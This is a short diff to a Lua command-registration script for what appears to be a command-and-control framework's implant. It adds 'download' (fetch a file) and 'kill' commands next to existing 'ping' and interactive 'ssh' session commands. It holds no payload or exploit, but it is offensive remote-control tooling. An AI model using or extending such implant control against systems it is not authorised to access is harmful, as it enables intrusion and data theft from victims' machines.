@@ -1,6 +1,8 @@
 CODE = {
     PING = 1,
-    SSH = 2
+    SSH = 2,
+    DOWN = 3,
+    KILL = 4
 }
 
 function ping(payload)
@@ -19,9 +21,27 @@ function ssh(payload)
     end
 end
 
+function download(payload)
+    print("command download from script with args", payload)
+    local err = addtask(CODE.DOWN, payload)
+    if err then
+        print("Error")
+    end
+end
+
+function kill(payload)
+    print("command kill from script with args", payload)
+    local err = addtask(CODE.KILL, payload)
+    if err then
+        print("Error")
+    end
+end
+
 -- impl, name, desc, func
 command("impl","ping","Ping the implant", ping)
 command("impl","ssh","Get an interactive session", ssh)
+command("impl","download","Download a file", download)
+command("impl","kill","Kill implant", kill)
 
 function OnRegister(...)
     local args = {...}
